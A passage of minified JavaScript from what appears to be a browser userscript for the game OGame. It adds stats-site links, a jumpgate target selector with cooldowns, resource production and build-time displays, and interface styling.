r.d(e.uni).toLowerCase()+encodeURI(d)},getInfuzaLink:function(a,b){var c,d;c={AE:"fr",AR:"es",BR:"pt",CZ:"cs",DE:"de",DK:"da",ES:"es",FR:"fr",HU:"hu",IT:"it",MX:"es",NL:"nl",PL:"pl",PT:"pt",RO:"ro",RU:"ru",SE:"sv"}[e.server]||"en";d=1===b?"&pora=alliances&value="+r.d(a):2===b?"&pora=players&value="+r.d(a):"";return"http://www.infuza.com/"+c+"/Search?server="+("HR"===e.server?"ogame.com.hr":e.domain)+encodeURI(d)},getOgniterLink:function(a,b){var c,d;c={AR:"ar",BA:"yu",BR:"br",CZ:"cz",DE:"de",DK:"dk",
ES:"es",FI:"fi",FR:"fr",GR:"gr",HR:"hr",HU:"hu",IT:"it",JP:"jp",MX:"mx",NL:"nl",NO:"no",PL:"pl",PT:"pt",RO:"ro",RU:"ru",SE:"se",SI:"si",SK:"sk",TR:"tr",TW:"tw",US:"us"}[e.server]||"en";d=a&&1===b?"/alliance/"+a:a&&2===b?"/player/"+a:"";return"http://www.ogniter.org/"+c+"/"+c+n.parseIntAbs(e.uni)+encodeURI(d)},showCumulative:function(){e.loadLevels(function(){var a,b,c;c="http://calc.antigame.de/?lang="+e.server.toLowerCase()+"&coords="+f.PlanetsActive.coords+"&type="+f.PlanetsActive.type+"&name="+
f.PlanetsActive.name+"&uni_speed="+e.get("S21")+"&robo="+e.get("R14")+"&nanite="+e.get("R15")+"&rlab="+e.get("R31")+(f.officers.technocrat?"&technocrat=1":"");for(a=1;45>a;a++)(b=e.get("R"+a))&&(c+="&"+a+"c="+b);for(a in f.ItemResearch)(b=f.UnitsAccount[a])&&(c+="&"+a+"c="+b);aa.showTool("T2A",c)})},showTool:function(a,b){var c;(c=document.getElementById("ago_tools_send"))||(c=document.body.appendChild(document.createElement("a")));c.href=b;c.style.display="none";c.target=a?"ago_tools_"+a:"_blank";
h.click(c)},sanitize:function(){document.querySelector('#links [name="oaButton"] .menubutton[name="oaOpt"]')?(e.set("Y71",3),m.setStorage("Options",e.getDataString("Options"))):e.is("Y71")&&(e.set("Y71",0),m.setStorage("Options",e.getDataString("Options")))}},$={Run:function(){$.status||($.status=4,$.Show())},Update:function(){var a=m.getStorage("InfoBox_Coords");a&&I.getUniverseByPlayerId(a,$.insertPlanets)},Show:function(){g("#toolLinksWrapper").append('<div><div id="ago_infobox" class="ago_infobox"><div class="ago_infobox_header"><span id="ago_infobox_title"></span><a id="ago_infobox_close" class="close_details" href="javascript:void(0);"> </a></div><div id="ago_infobox_content"></div></div></div>');
g("#ago_infobox_close").bind("click",$.clickClose)},clickClose:function(){m.deleteStorage("InfoBox_Coords");g("#ago_infobox").hide()},insertPlanets:function(a){$.Run();g("#ago_infobox").show();for(var b="",c=0,d=J.check(e.page,"fleet1","fleet2","galaxy")?!1:!0,j=0;j<a.length;j++)var f=a[j].cP.split(":"),c=n.d(a[j].id),b=b+('<tr><td class="ago_infobox_player">'+a[j].nP+'</td><td class="ago_infobox_coords"><a href="'+(d?"index.php?page=galaxy&galaxy="+f[0]+"&system="+f[1]+"&position="+f[2]:"javascript:void(0)")+
'" coords="'+a[j].cP+'">'+a[j].cP+"</a></td><tr>");g("#ago_infobox_content").html(w.TABLE("","","100%","","",b));d||g("#ago_infobox_content").bind("click",function(a){if(a=g(a.target).attr("coords"))"galaxy"===e.page?(R.selectCoords=a,a=a.split(":"),h.setValueByIdInteger("galaxy_input",a[0]),h.setValueByIdInteger("system_input",a[1]),h.click("#showbutton a")):N.Autocopy&&N.Autocopy(a)});m.setStorage("InfoBox_Coords",c);I.getPlayerById(c,$.insertPlanetsTitle)},insertPlanetsTitle:function(a){if(a){var b=
a.name;g("#ago_infobox_title").html(b);$.currentPlayerId=a.id;$.currentPlayerName=a.name}}},Ja={Run:function(){L.ShowConstructions();Ja.Show()},Ready:function(){Ja.Timer()},Tooltip:function(a,b,c,d){w.hasClass(c,"tooltipLeft")&&g(a).parent().hasClass("planetMoveStart")&&(b.showOn=!1);w.hasClass(c,"tooltipBottom")&&"moon"===g(a).parent().attr("id")&&(d+=2);return d},Show:function(){var a,b="";if((a=document.getElementById("detailWrapper"))&&e.is("O12")&&e.type===T){for(var c in f.ItemResource)b+='<tr><td class="desc">'+
f.getItemLabel(c)+'</td><td class="data"><span id="ago_resources_production_'+c+'"></span></td></tr><tr><td class="desc"></td><td class="data"><span id="ago_resources_storageTime_'+c+'" class="ago_resources_storageTime">&nbsp;</span></td></tr>';g("#planetDetails tr:first-child",a).before(b)}},Timer:function(){var a,b,c,d,j,h;if(e.is("O12")&&e.type===T)for(a in f.ItemResource)b=f.UnitsActive[a]||0,d=f.UnitsActive[{metal:"22",crystal:"23",deuterium:"24"}[a]]||0,c=f.UnitsActive[{metal:"71",crystal:"72",
deuterium:"73"}[a]]||0,j=b>=d?"overmark":b>=0.9*d?"middlemark":"",h=(0<c&&b<d?'<span class="undermark">(+'+r.formatNumber(c)+") </span>":'<span class="overmark">(0) </span>')+r.formatNumber(b)+" / "+r.formatNumber(d),g("#ago_resources_production_"+a).attr("class",j).html(h),b=(b=(j=s[a+"Ticker"]?s[a+"Ticker"].config:"")&&0<c&&b<d?Math.floor((j.limit-j.available)/j.production):0)?A.format(A.getFinishTime(b)):"&nbsp;",g("#ago_resources_storageTime_"+a).html(b)},styles:function(){e.is("O12")&&q.setCache([".ago_planet #planetdata { margin-top: 4px; height: 225px; }",
".ago_planet #planetdata .overlay { opacity: 0.8; }",".ago_planet #planetdata tr:nth-child(2) td, .ago_planet #planetdata tr:nth-child(4) td { padding: 0 5px 3px 5px; }",".ago_planet #planetdata tr:nth-child(6) td { padding: 0 5px 6px 5px; }",".ago_planet div#planetDetails { height: 202px; }",".ago_resources_storageTime { font-size: 10px; color: green; vertical-align: top; }"])}},Ra={Run:function(){L.ShowNames();L.ShowConstructions()},Tooltip:function(a,b,c,d){if(w.hasClass(c,"tooltip")){if(w.hasClass(c,
"slideIn"))return J.check(e.get("B21"),1,3)?2:1;if("resources"===g(a).parent().attr("id"))return 0}return d},Show:function(){L.Show("resources")},styles:function(){L.styles()}},Sa={Run:function(){Sa.Show()},Show:function(){g("<input>").attr("class","buttonOK").attr({type:"button",value:"0%",ref:"0"}).click(function(){g("select").val(this.getAttribute("ref"))}).appendTo(".factorbutton").clone(!0).attr({value:"100%",ref:"100"}).appendTo(".factorbutton")}},Ta={Run:function(){L.ShowNames();L.ShowConstructions()},
Tooltip:function(a,b,c,d){if(w.hasClass(c,"tooltip")){if(w.hasClass(c,"slideIn"))return J.check(e.get("B21"),1,3)?2:1;if("resources"===g(a).parent().attr("id"))return 0}return d},Show:function(){L.Show("station")},styles:function(){L.styles()}},z={liveSettings:["B33","B34","B35"],Run:function(){!z.status&&e.is("B30")&&(z.status=4,z.styles())},Ready:function(){z.Minimum.coords?z.setTarget(null,f.PlanetsByCoords[z.Minimum.coords]):e.get("B32")&&z.setTarget(null,"99");z.updateDisplay();h.addEvent("#jumpgate .send_none a",
"click",z.updateDisplay,!1,null,"jumpgate");K.disableAutocomplete()},Unload:function(a){if(a&&a.target&&"DIV"===a.target.nodeName&&-1<(a.target.className||"").indexOf("ui-dialog"))z.Timer=null,h.removeEventCacheAll("jumpgate"),B.feedbackPlanets()},Keydown:function(a,b,c,d){if(65===a.keyCode)return h.click(".secondcol #sendall",d),!1;if(77===a.keyCode)return h.click(".secondcol #sendmost",d),!1;if(81===a.keyCode)return h.click(".secondcol .send_none a",d),!1;if(11===c&&(38===a.keyCode||40===a.keyCode&&
f.ItemShip[n.parseIntAbs(a.target.id)+""]))if(!la||e.is("A25"))return c=3===b?1E3:2===b?100:1===b?10:1,b=h.getValueInteger("#"+a.target.id,d),b=38===a.keyCode?b+c:b-c,h.setValue("#"+a.target.id,Math.max(b,0),d),h.trigger("#"+a.target.id,"keyup",d),a.preventDefault(),!1;return n.isMinMax(a.keyCode,112,123)&&e.is("A22")?(z.setTarget(a,a.keyCode-111),a.stopPropagation(),a.preventDefault(),!1):!0},Show:function(){var a,b,c,d,j;z.Run();a=document.getElementById("jumpgate");if(4<=z.status&&a&&!a.getAttribute("ago-status")){a.setAttribute("ago-status",
1);z.Minimum=f.splitCurrentTask(e.get("B38"),ba,ta,ha);z.Maxi={};b=a.querySelectorAll(".ship_selection_table .ship_txt_row > a");for(j=0;j<b.length;j++)b[j]&&b[j].parentNode&&((d=n.parseIntAbs(h.getAttribute("img","class",b[j])))&&(z.Maxi[d]=n.parseIntAbs(h.getTextByClass("quantity",b[j].parentNode))),(c=b[j].parentNode.children[1])&&b[j].appendChild(c));f.updateUnits(z.Maxi,1,0,!0);c=h.create("span",{"class":"float_left send_most"});c.appendChild(h.createA({id:"sendmost","class":"tooltip",title:e.label("F37")}));
h.after(a.querySelector(".secondcol .send_all"),c);h.addEvent(c,"click",z.setMostShips,!1,null,"jumpgate");z.Target=[];if((b=a.querySelector('#jumpgateForm select[name="zm"]'))&&b.options){for(j=0;j<b.options.length;j++)c=n.d(f.PlanetsByCoords[f.stripCoords(b.options[j].textContent)])||88,z.Target[c]={value:b.options[j].value,text:b.options[j].textContent};b.innerHTML="";e.get("B32")&&h.append(b,h.create("option",{value:"99",rel:"99"},null," - "));for(j=1;j<z.Target.length;j++)z.Target[j]&&h.append(b,
h.create("option",{value:z.Target[j].value,rel:j},null,z.Target[j].text));b.onchange=z.updateDisplay}if(e.is("B31")&&z.Target.length){h.setDisplayAll("#jumpgate h4, #selecttarget > .fright","",!1,a);b=h.create("table",{id:"ago_jumpgate_target"});for(j=1;j<f.PlanetsByIndex.length;j++)if((d=f.Planets[f.PlanetsByIndex[j]].moon)&&(z.Target[j]||d===f.PlanetsActive.id||f.Planets[d].jumpgate)){c=j;var g=void 0,k=g=void 0,l=void 0,l=l=g=void 0,k=h.create("tr",{rel:c,"data-panel":"I40","data-panel-value":f.Planets[d].coordstype});
h.addEvent(k,"click",y.viewTab,!1,null,"jumpgate");l=k.appendChild(h.create("td",{width:"310px"}));c&&z.Target[c]?(g=h.createA({rel:c,"class":"ago_target ago_moon"}),h.addEvent(g,"click",z.setTarget,!1,null,"jumpgate"),h.addEvent(g,"mouseleave",y.slideOut,!1,null,"jumpgate"),h.addEvent(g,"dblclick",z.setTargetJump,!1,null,"jumpgate"),l=l.appendChild(g)):k.className=f.PlanetsActive.index===c?"ago_target_current":"ago_target_locked";l=l.appendChild(h.create("table",{"class":"ago_jumpgate_targetcontent"})).appendChild(h.create("tr"));
l.appendChild(h.create("td",{"class":"ago_color_shortkey"},{width:"14px"},c));l.appendChild(h.create("td",null,{width:"58px"},f.Planets[d].coords));l.appendChild(h.create("td",null,{width:"80px",maxWidth:"80px"},f.Planets[d].name));l.appendChild(h.create("td",null,{width:"16px",maxWidth:"16px"})).appendChild(h.create("span",{"class":"ago_jumpgate_cooldown"}));l.appendChild(h.create("td",null,{width:"20px"})).appendChild(h.create("img",{src:f.Planets[d].img},{width:"16px",height:"16px"}));l.appendChild(h.create("td",
null,{width:"80px",maxWidth:"80px"},f.Planets[d].name));l=k.appendChild(h.create("td",{width:"65px","class":"ago_jumpgate_target_ships ago_color_normal"}));g=f.getUnits(d);g=g.timeShips?r.formatNumber(g.ships):" ? ";g=h.createA({"class":"ago_panel_view"},null,g);h.addEvent(g,"mouseleave",y.slideOut,!1,null,"jumpgate");l.appendChild(g);(c=k)&&b.appendChild(c)}h.prepend(a.querySelector("#selecttarget"),b);b=h.create("div",{"class":"ago_jumpgate_settings ago_color_normal"});c=b.appendChild(h.create("ul"));
for(j=0;j<z.liveSettings.length;j++)c.appendChild(h.create("li",{id:"ago_jumpgate_"+z.liveSettings[j]},null,e.label(z.liveSettings[j])));h.after(a.querySelector("#selecttarget > .fright"),b);z.updateCooldown(!0);z.Timer=z.updateCooldown}z.Target.length||(z.Timer=z.updateOverlay);s.ogame_jumpgateDone=s.jumpgateDone;s.jumpgateDone=z.Done;e.is("B34")&&(s.jumpToTarget=function(){document.location.href=document.location.href.split("?")[0]+"?page=fleet1"});h.addEvent(a.parentNode.parentNode,"DOMNodeRemoved",
z.Unload,!1,null,"jumpgate");setTimeout(z.Ready,0)}a=b=c=b=b=b=c=null},updateOverlay:function(){var a;if(a=document.querySelector("#jumpgateNotReady #cooldown"))a=n.parseIntAbs(a.textContent),a||(z.Timer=null,h.click('#menuTable a[href*="openJumpgate"]'))},updateCooldown:function(a){var b,c,d,j=0;if(a||-4<z.cooldown){a=document.querySelectorAll("#ago_jumpgate_target > tr");for(c=0;c<a.length;c++)if((b=(b=n.d(a[c].getAttribute("rel")))&&f.PlanetsByIndex[b]?f.Planets[f.PlanetsByIndex[b]].moon:"")&&
f.Planets[b].jumpgate)d=3600/e.get("S21")-(A.timestamp()-f.Planets[b].jumpgate),0<=d&&(j++,b=a[c].getElementsByClassName("ago_jumpgate_cooldown")[0],60>=d&&h.addClass(b,"ago_jumpgate_cooldown_seconds"),d=60<d?Math.ceil(d/60):Math.floor(d),h.setText(b,Math.floor(d)));z.cooldown=j||z.cooldown-1}},styles:function(){q.setCache(['.send_most a { background: url("'+q.image.ShipsMost+'") no-repeat scroll left top transparent; display: block; height: 32px; width: 32px; }',".send_most a:hover { background-position: 0 -32px; }",
"#jumpgate a:hover { text-decoration: none ! important; }","#jumpgate .ship_txt_row a > p:hover { background-color: #212A33; }","#ago_jumpgate_target { border-collapse: collapse; width: 378px; margin: 0 0 10px 0; float: right; position: relative; right: 10px; top: 0px; }",".ago_jumpgate_target_ships { text-align: right; }",".ago_jumpgate_targetcontent { border-collapse: collapse; table-layout: fixed; }",".ago_jumpgate_targetcontent td { white-space: nowrap; overflow: hidden; padding: 0px 3px; }",
"#ago_jumpgate_target a.ago_target, #ago_jumpgate_target a.ago_panel_view { text-decoration: none; font-size: 11px; white-space: nowrap; display: inline-block; width: 100%; height: 16px; padding: 2px 0px; }","#ago_jumpgate_target a.ago_panel_view { padding-right: 3px; }","#ago_jumpgate_target .ago_color_shortkey { text-align: right; }","#ago_jumpgate_target .ago_jumpgate_cooldown { display: inline-block; float: right; }",".ago_jumpgate_settings { display: inline-block; width: 215px; margin: 15px 15px 5px 15px; font-size: 10px; }",
".ago_jumpgate_settings li { display: none; list-style-type: disc; } "],!0)},Done:function(a){var b,c,d,j,h,k;try{k=g.parseJSON(a);if(k.status&&(b=document.getElementById("jumpgate"))){f.Planets[k.targetMoon].jumpgate=A.timestamp();f.Planets[f.PlanetsActive.id].jumpgate=A.timestamp();B.savePlanets();c={};d=b.querySelectorAll(".ship_selection_table td.ship_input_row > input");for(j=0;j<d.length;j++)(h=n.parseIntAbs(d[j].id))&&(c[h]=n.parseIntAbs(d[j].value));f.updateUnits(c,3,0,!0);f.updateUnits(c,
2,k.targetMoon)}k.status&&e.is("B33")?(k.errorbox={},a=JSON.stringify(k),s.ogame_jumpgateDone(a),s.jumpToTarget()):s.ogame_jumpgateDone(a)}catch(l){s.ogame_jumpgateDone(a)}},setMostShips:function(){var a={};f.updateResources(z.Maxi);for(var b in z.Maxi)a[b]=Math.max(z.Maxi[b]-n.d(z.Minimum[b]),0);if(e.is("B35")){b=Math.ceil(z.Maxi.resources/25E3);var c=Math.max(b-n.d(z.Maxi[Q]),0),c=0<c?5*c:0;b>n.d(z.Minimum[Q])&&(a[Q]=Math.max(z.Maxi[Q]-b,0));c>n.d(z.Minimum[V])&&(a[V]=Math.max(z.Maxi[V]-c,0))}s.setMaxIntInput("#jumpgateForm",
a)},setTargetJump:function(a){e.is("A24")&&(z.setTarget(a),h.click("#jumpgate .secondcol input.btn_blue"))},setTarget:function(a,b){var c;if(c=document.getElementById("jumpgate"))if(b=b||(a&&a.currentTarget?a.currentTarget.getAttribute("rel"):""))(c=c.querySelector('select[name="zm"] option[rel="'+b+'"]'))&&h.setValueChange(c.parentNode,c.value)},updateDisplay:function(){var a,b,c,d;if(a=document.getElementById("jumpgate")){if(b=h.getSelectedNode(a.querySelector('select[name="zm"]')))if((d=b.getAttribute("rel"))&&
f.PlanetsByIndex[d]){if(c=a.querySelector("#selecttarget .dropdown > a"))c.setAttribute("data-value",b.value),c.textContent=b.textContent;f.PlanetsByIndex[d]&&B.feedbackPlanets(f.Planets[f.PlanetsByIndex[d]].coords,Y)}e.is("B31")&&(h.removeClassAll("#ago_jumpgate_target a","ago_feedback",a),d&&h.addClass('#ago_jumpgate_target a[rel="'+d+'"]',"ago_feedback",a));for(b=0;b<z.liveSettings.length;b++)h.setDisplay("#ago_jumpgate_"+z.liveSettings[b],"list-item",e.is(z.liveSettings[b]),a)}}},$a={Ready:function(){K.disableAutocomplete()},
Tooltip:function(){return 0}},Ka={Run:function(){L.ShowNames();L.ShowConstructions();Ka.ShowLevels()},Tooltip:function(a,b,c,d){if(w.hasClass(c,"tooltip")){if(w.hasClass(c,"slideIn"))return J.check(e.get("B21"),1,3)?2:1;if("resources"===g(a).parent().attr("id"))return 0}return d},Show:function(){L.Show("research")},ShowLevels:function(){var a,b,c;a=document.querySelectorAll("#buttonz li .detail_button");for(b=0;b<a.length;b++)c=a[b].getAttribute("ref"),c in f.ItemResearch&&(f.UnitsAccount[c]=+h.getTextFromChildnode(".level",
a[b])||0,e.is("B04")&&(c=Math.abs(f.ItemResearch[c])>f.UnitsAccount[c]?q.color.textPaleRed:0>f.ItemResearch[c]?q.color.textLightGreen:"")&&h.setStyles(".level",{color:c},a[b]));f.UnitsAccount["100"]=A.timestamp()},styles:function(){L.styles()}},ab={},Ua={Run:function(){L.ShowNames();L.ShowConstructions();L.Maxi&&f.updateUnits(L.Maxi,1,0,!0)},Ready:function(){K.disableAutocomplete()},Tooltip:function(a,b,c,d){if(w.hasClass(c,"tooltip")){if(w.hasClass(c,"slideIn"))return J.check(e.get("B21"),1,3)?2:
1;if("resources"===g(a).parent().attr("id"))return 0}return w.hasClass(c,"tooltipLeft")&&"maxlink"===g(a).attr("id")?d+2:d},Keydown:function(a,b,c){if(11===c&&(38===a.keyCode||40===a.keyCode&&"number"===a.target.id))if(!la||e.is("A25"))return c=3===b?1E3:2===b?100:1===b?10:1,b=h.getValueInteger("#number"),b=38===a.keyCode?b+c:b-c,h.setValue("#number",Math.max(b,0)),h.trigger("#number","keyup"),a.preventDefault(),!1;return!0},Show:function(){L.Show("shipyard")},styles:function(){L.styles()}},Va={Run:function(){L.ShowNames();
L.ShowConstructions()},Ready:function(){K.disableAutocomplete()},Tooltip:function(a,b,c,d){if(w.hasClass(c,"tooltip")){if(w.hasClass(c,"slideIn"))return J.check(e.get("B21"),1,3)?2:1;if("resources"===g(a).parent().attr("id"))return 0}return w.hasClass(c,"tooltipLeft")&&"maxlink"===g(a).attr("id")?d+2:d},Keydown:function(a,b,c){if(11===c&&(38===a.keyCode||40===a.keyCode&&"number"===a.target.id))if(!la||e.is("A25"))return b=3===b?1E3:2===b?100:1===b?10:1,c=h.getValueInteger("#number"),c=38===a.keyCode?
c+b:c-b,h.setValue("#number",Math.max(c,0)),h.trigger("#number","keyup"),a.preventDefault(),!1;return!0},Show:function(){L.Show("defense")},styles:function(){L.styles()}},L={resourceMode:2,Run:function(){L.isRun||(L.isRun=!0)},Show:function(a){L.Run();if(L.isRun&&K.isFirstShow("#content")){var b=h.getAttribute('#detail input[name="type"]',"value").trim();L.resourceCost={metal:0,crystal:0,deuterium:0};for(var c in L.resourceCost)L.resourceCost[c]=n.parseIntFormat(g('#detail #resources li[title*="'+
f.getItemLabel(c)+'"]').attr("title"));L.showResources();"resources"===a&&L.showProduction(b);L.showRange(b);e.is("B10")&&(g("#detail #resources #number").bind("keyup blur change",L.showResources),g("#detail #maxlink").bind("click",L.showResources))}},showRange:function(a){if("42"===a){a=g("#detail .solarSatEnergyInfo").text();var b=n.parseIntFormat(a);if(b){var c=Math.max(f.PlanetsActive.system-b+1,1),b=Math.min(f.PlanetsActive.system+b-1,e.get("S23"));a=a+" ("+f.PlanetsActive.galaxy+":"+c+" - "+
f.PlanetsActive.galaxy+":"+b+")";g("#detail .solarSatEnergyInfo").text(a)}}},showResources:function(){var a,b,c,d,j;a=document.getElementById("detail");if(e.is("B10")&&a&&(d=h.getValue('input[name="type"]',a).trim())&&g("#detail div.pic").get(0)&&0===g("#detail li.abort").length){0===g("#ago_items_resource").length?g("#detail div.pic").append('<div id="ago_items_resource" class="ago_text_background_dark"></div>'):g("#ago_items_resource a").unbind("click");c=h.getValueInteger("#resources #number",
a);b=n.parseIntAbs(h.getTextFromChildnode("#content > .level",a));a=A.parseFormatedTime(h.getTextFromChildnode("#action li .time",a));a*=c||1;b={metal:L.resourceCost.metal*(c||1),crystal:L.resourceCost.crystal*(c||1),deuterium:L.resourceCost.deuterium*(c||1),type:f.PlanetsActive.type,name:d,detail:200<d?c:b+1};f.updateCoords(b,null,2);c='<tr><td colspan="2" class="ago_items_resource_header">'+e.label("B11")+'<a href="javascript:void(0);" rel="'+(200>d||c?f.joinTask(b,ba):"")+'" title="'+e.label("I0T")+
'" class="tooltip dark_highlight_tablet"><span class="icon icon_info float_right"></span></a></td></tr>';for(j in L.resourceCost)c=0<b[j]?c+('<tr><td class="ago_items_resource_label">'+f.getItemLabel(j)+'</td><td class="ago_items_resource_value">'+r.formatNumber(b[j])+"</td></tr>"):c+'<tr><td colspan="2">&nbsp;</td></tr>';c+='<tr><td colspan="2">&nbsp;</td></tr><tr><td colspan="2" class="ago_items_resource_header">'+e.label("B12")+"</td></tr>";for(j in L.resourceCost)c=0<b[j]-f.UnitsActive[j]?c+('<tr><td class="ago_items_resource_label">'+
f.getItemLabel(j)+' </td><td class="ago_items_resource_value text_palered">'+r.formatNumber(b[j]-f.UnitsActive[j])+"</td></tr>"):c+'<tr><td colspan="2">&nbsp;</td></tr>';c+='<tr><td colspan="2">&nbsp;</td></tr><tr><td class="ago_items_finishtime">'+A.format(A.getFinishTime(a))+'</td><td class="ago_items_resource_value">'+A.formatTime(a,!0)+"</td></tr>";g("#ago_items_resource").html(w.TABLE("","","auto","","5px",c));g("#ago_items_resource a").bind("click",function(){y.addConstruction(g(this).attr("rel"))})}},
styles:function(){q.setCache([".ago_items_text { position: absolute; top: 4px; right: 2px; max-width: 70px; height: auto; padding: 2px 3px; text-align: right; overflow: hidden; }","#resources .ago_items_text, #station .ago_items_text, #station-moon .ago_items_text, #research .ago_items_text { top: 14px; }",".ago_items_textName { font-size: 10px; width: 70px; }",".ago_items_textInfo { font-size: 11px; top: 32px !important; }",".ago_items_textCount { font-size: 11px; top: 48px !important; }","#resources #building .ago_items_text { max-width: 92px; }",
"#resources #building .ago_items_textName { width: 90px; }","#resources #building .ago_items_textInfo { top: 48px !important; }","#resources #building .ago_items_textCount { top: 68px !important; }",".off .ago_items_text { color: "+q.color.textInactive+"; }",".on .ago_items_text { color: "+q.color.textBrighter+"; }",".disabled .ago_items_text { color: "+q.color.textPaleRed+"; }",".ago_items_finishtime { color: green; }","#ago_items_resource { position: absolute; bottom: 0; right: 0; color: "+q.color.textBright+
"; }","#ago_items_resource table { min-width: 165px; max-width: 190px; }","#ago_items_resource td { padding: 0px; font-size: 11px; }","#ago_items_resource .ago_items_resource_header { font-size: 12px; color: "+q.color.textBlue+"; padding: 6px 0; }","#ago_items_resource .ago_items_resource_label { padding: 0 5px 0 10px; }","#ago_items_resource .ago_items_resource_value { text-align: right; }","#ago_items_resource td.ago_items_finishtime { padding: 0 10px 0 0; }"])},showProduction:function(a){function b(a){return'<span class="'+
(0>a?"overmark":0<a?"undermark":"middlemark")+'"> ('+(0<a?"+":"")+r.formatNumber(Math.ceil(a))+")</span>"}var c,d,j,k;a&&(d=+h.getTextFromChildnode('#buttonz a[ref="'+a+'"] .level')||0,J.check(a,"1","2","3")&&(j=g("#action #possibleInTime").length?2:1,k=g("#action li .time").eq(j),j=f.UnitsActive.energy-n.parseIntFormat(g(k).text()),c=Math.ceil(-j/f.getProductionEnergy("212")),c=0<c?"<span> ("+c+" "+e.label("K212")+")</span>":"",g(k).append(b(j)+c),j=f.getProductionResources(a,d),k=f.getProductionResources(a,
d+1),c="<li>"+e.label("B13")+': <span class="time">'+r.formatNumber(k)+b(k-j)+"</span></li>",g("#action ul").append(c)),"212"===a&&0>f.UnitsActive.energy&&(c=Math.ceil(Math.abs(f.UnitsActive.energy)/f.getProductionEnergy("212")),c="<li>"+e.label("L212")+': <span class="time">'+r.formatNumber(c)+b(f.getProductionEnergy("212")*c)+"</span></li>",g("#action ul").append(c)),"12"===a&&(j=-f.getConsumption(a,d),k=-f.getConsumption(a,d+1),c="<li>"+e.label("L093")+': <span class="time">'+r.formatNumber(k)+
b(k-j)+"</span></li>",g("#action ul").append(c)),J.check(a,"22","23","24")&&(j=f.getStorageCapacity(d),k=f.getStorageCapacity(d+1),c="<li>"+r.trim(g("#description div.display div").contents(":first-child").text())+' <span class="time">'+r.formatNumber(k)+b(k-j)+"</span></li>",g("#action ul").append(c)),J.check(a,"1","2","3","4","22","23","24")&&g(".techtree").css("display","none"),g("#action ul").css("padding-top","2px"))},ShowNames:function(){if(e.is("B21")){L.Run();L.Maxi={};for(var a=g("#buttonz .buildingimg > a[ref]"),
b=0;b<a.length;b++){var c=a.get(b),d=r.trim(g(c).attr("ref")),j=r.trim(g("span.textlabel",c).text());if(c&&d&&j){L.Maxi[d]=n.parseIntAbs(P.afterHTML(g("span.level",c).html(),"</span>"));var j=J.check(e.get("B21"),1,3)?'<span class="ago_items_textName ago_items_text ago_text_background">'+j+"</span>":"",h="",k="";if((J.check(e.page,"shipyard","defense")||"resources"===e.page&&"212"===d)&&J.check(e.get("B21"),2,3)&&f.Item[d]&&g(c).parent().parent().parent().hasClass("on"))f.officers.commander&&(h=f.UnitsActive.deuterium/
(f.Item[d].deuterium||1),(h=r.formatNumber(Math.floor(Math.min(Math.min(f.UnitsActive.metal/(f.Item[d].metal||1),f.UnitsActive.crystal/(f.Item[d].crystal||1)),h))))&&J.check(d,"407","408")&&(h=1),h='<span class="ago_items_textCount ago_items_text ago_text_background">'+h+"</span>"),"212"===d&&0>f.UnitsActive.energy&&(k='<span class="ago_items_textInfo ago_items_text ago_text_background">'+Math.ceil(Math.abs(f.UnitsActive.energy)/f.getProductionEnergy("212"))+"</span>");g(c).append(j+k+h)}}}},ShowConstructions:function(){function a(a,
b){var c=n.parseIntFormat(b);a&&c&&(c='<tr class="data ago_items_finishtime"><td> </td><td style="padding: 6px 0 0 12px; font-weight: 700;">'+A.format(A.getFinishTime(c))+"</td></tr>",g(a.parentNode.parentNode).after(c))}if(e.is("B02")){L.Run();var b=document.getElementById("Countdown"),c=document.getElementById("researchCountdown"),d=document.getElementById("moveCountdown"),j=document.getElementById("shipAllCountdown")||document.getElementById("shipAllCountdown7");if(b||c||d||j)if(h.getScript(),
h.ogameScript){if(b||c||d)if((b=h.ogameScript.match(/baulisteCountdown\(getElementByIdWithCache\(["']\w+["']\)\,\s*\d*/gi))&&b.length)for(c=0;c<b.length;c++){var f=b[c].match(/["'](\w+)["']\)\,\s*(\d*)/i);if(f[1])if("moveCountdown"===f[1]){if(f=n.parseIntFormat(f[2]))f='<span class="data ago_items_finishtime" style="padding: 0 0 0 12px; font-weight: 700;">'+A.format(A.getFinishTime(f))+"</span>",g(d.parentNode).after(f)}else a(document.getElementById(f[1]),f[2])}j&&(d=h.ogameScript.match(/shipCountdown\((\s*getElementByIdWithCache\(["']\w+["']\)\,)+(\s*\d*\,){3,3}/i))&&
a(j,d[2])}}}},l={textTarget:"Target:",ShowInfo:function(){function a(a,c){return l.Task[a]||l.Task[c]?"<tr>"+b(a,l.Task[a])+b(c,l.Task[c])+"</tr>":""}function b(a,b){return b?'<td class="ago_summary_ships_label">'+(a?e.label("L"+a):"")+'</td><td class="ago_summary_ships_value">'+r.formatNumber(b)+"</td>":'<td class="ago_summary_ships_label ago_summary_shipsNone">'+(a?e.label("L"+a):"")+'</td><td class="ago_summary_ships_value"></td>'}var c={5:"FL0",9:"F60",11:"F70",12:"F80",13:"F90",15:"FH0",16:"FP0",
17:"FA0"}[l.Task.routine],c="<li>"+(c?e.label(c):"&nbsp;")+"</li><li></li>",d=a(V,Q)+a("204","205")+a("206","207")+a("208","209")+a(xa,"211")+a("213","214")+a("215",""),c='<div id="ago_summary_info"><ul>'+c+'</ul></div><div id="ago_summary_ships">'+w.TABLE("","","438px",0,"8px",d)+"</div>";g("#planet").append(c)},styles:function(){e.is("F00")&&q.setCache(['.ago_speed_1 [rel="1"] { color: #F30 !important; }','.ago_speed_2 [rel="2"] { color: #F60 !important; }','.ago_speed_3 [rel="3"] { color: #F90 !important; }',
'.ago_speed_4 [rel="4"] { color: #FC0 !important; }','.ago_speed_5 [rel="5"] { color: #FF0 !important; }','.ago_speed_6 [rel="6"] { color: #CF0 !important; }','.ago_speed_7 [rel="7"] { color: #9F0 !important; }','.ago_speed_8 [rel="8"] { color: #6F0 !important; }','.ago_speed_9 [rel="9"] { color: #3F0 !important; }','.ago_speed_10 [rel="10"] { color: #0F0 !important; }','#fleet2 #planet, #fleet3 #planet { background-image: url("http://gf1.geo.gfsrv.net/cdn99/5368907a3fd41c0a3a5bbf077fb24b.gif"); height: auto; margin-bottom: 0px; overflow: hidden; }',
"#ago_summary_info { float: left; height: auto; width: 200px; }","#ago_summary_ships { float: left; height: auto; overflow: hidden; width: 450px; }","#planet.shortHeader #ago_summary_info, #planet.shortHeader #ago_summary_ships { display: none; }","#planet:not(.shortHeader)> h2 { font-size: 13px; margin-left: 220px; padding-top: 1px; }","#planet .toggleHeader { right: 3px; top: 1px; }","#ago_summary_info ul { margin: 5px 5px 5px 20px; }","#ago_summary_info li { font-size: 12px; color: "+q.color.textBlue+
